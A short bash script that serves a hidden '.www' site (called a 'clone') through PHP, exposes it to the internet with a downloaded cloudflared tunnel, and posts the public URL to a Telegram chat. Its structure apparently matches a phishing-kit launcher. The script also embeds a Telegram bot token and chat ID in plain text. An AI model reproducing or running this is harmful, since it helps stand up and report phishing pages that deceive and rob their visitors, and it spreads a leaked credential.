
#!/bin/bash
bot_token="6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"
chat_id="-1001809635857"
host='127.0.0.1'
port='8084'

# Define your custom paths
phpmyadmin_path="/admin/phpmyadmin/index.php"
admin_panel_path="/admin/index.php"
web_app_path="/admin/admin_dashboard.php"
node_app_path="./"

start_node_server() {
    node "$node_app_path" > /dev/null 2>&1 &
}

send_telegram_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
        -d "chat_id=$chat_id" \
        -d "text=$message" \
        -d "parse_mode=Markdown"
}

setup_clone() {
    cd .www && php -S "$host":"$port" > /dev/null 2>&1 &
}
get_cloudflared() {
    # Detect the system architecture
    system_arch=$(uname -m)

    # Define the URL based on the architecture
    if [ "$system_arch" == "x86_64" ]; then
        binary_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    elif [ "$system_arch" == "aarch64" ]; then
        binary_url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    else
        echo "Unsupported system architecture: $system_arch"
        exit 1
    fi

    # Download and install cloudflared
    curl -sSL -o cloudflared "$binary_url"
    chmod +x cloudflared
    mv cloudflared ./.host/
    send_telegram_message ""
}


start_cloudflare_tunnel() {
    { sleep 1; setup_clone; }

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log 2>&1 & > /dev/null 2>&1 &
    fi

    { sleep 12; clear; }
}

# Start the Node.js server
start_node_server

get_cloudflared
start_cloudflare_tunnel
cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
cldflr_url1=${cldflr_url#https://}
telegram_message="Cloudflare URL: $cldflr_url"
send_telegram_message "$telegram_message"